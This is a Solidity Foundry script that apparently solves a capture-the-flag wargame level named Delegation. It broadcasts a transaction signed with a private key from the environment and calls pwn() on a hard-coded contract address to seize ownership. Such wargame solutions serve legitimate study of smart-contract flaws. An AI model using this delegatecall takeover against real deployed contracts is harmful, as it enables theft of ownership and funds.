// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegate constant delegateInstance =
        Delegate(0xAA000aAB717Cf6C02eECA880a8B7012Cb891DF40);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        delegateInstance.pwn();

        vm.stopBroadcast();
    }
}
